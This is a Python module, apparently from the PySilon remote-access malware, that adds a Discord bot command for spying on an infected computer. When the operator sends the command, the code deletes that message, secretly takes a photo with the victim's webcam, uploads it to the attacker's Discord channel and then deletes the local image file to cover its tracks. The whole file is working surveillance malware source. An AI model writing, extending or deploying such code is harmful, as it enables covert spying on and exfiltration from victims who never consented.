import pygame.camera
import subprocess
import time
import resources.modules.misc as pysilon_misc

@client.command(name="webcam")
async def webcam(ctx, action=None, camera_index=None):
    await ctx.message.delete()
    if action == "photo":
        pygame.camera.init()
        cameras = pygame.camera.list_cameras()
        if not cameras:
            return await ctx.send('```❗ No cameras found.```')
        if camera_index != None:
            camera_index = int(camera_index)
        else: camera_index = 0
        try:
            camera = pygame.camera.Camera(cameras[camera_index])
            camera.start()
        except IndexError:
            return await ctx.send('Camera with index ' + str(camera_index) + ' was not found.')
        time.sleep(1)
        image = camera.get_image()
        camera.stop()
        pygame.image.save(image, 'webcam.png')
        await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File('webcam.png'))
        subprocess.run('del /s webcam.png', shell=True)
    elif action == "video":
        pass # todo
    else:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .webcam <action> <camera_index (default: 0)>\nActions:\n    photo - take a photo with target PC\'s webcam```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)